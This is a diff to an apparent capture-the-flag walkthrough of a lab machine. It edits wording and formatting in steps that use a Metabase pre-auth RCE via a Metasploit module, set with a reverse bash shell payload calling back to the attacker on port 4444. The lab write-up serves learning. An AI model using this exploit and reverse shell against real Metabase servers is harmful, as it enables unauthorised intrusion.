@@ -18,10 +18,9 @@ echo '10.10.11.233 data.analytical.htb | sudo tee -a /etc/hosts'
 
 # Foothoold
 
-The Loginpage leads us to the Software Metabase. By google 'metabase exploit' one of the first links talks about an Pre-Auth RCE. https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/
+The Loginpage leads us to the Software Metabase. By google 'metabase exploit' one of the first links is about a Pre-Auth RCE. https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/
 
 This article explains it in detail. By searching for the setup-token at the sourcecode of the login-pages it is verified this works. 
-Using Metasploit is the easiest ways in.
 
 ## Using Metasploit to gain access
 
@@ -33,14 +32,17 @@ search Metabase
 use 0
 ```
 
+```
 Module options(exploit/linux/http/metabase_setup_token_rce):
 RHOSTS     data.analytical.htb  
 RPORT      80
 TARGETURI  / 
-
+```
+```
 Payload options(cmd/unix/reverse_bash):
 LHOST  tun0
 LPORT  4444
+```
 
 ## User SSHlogin
 
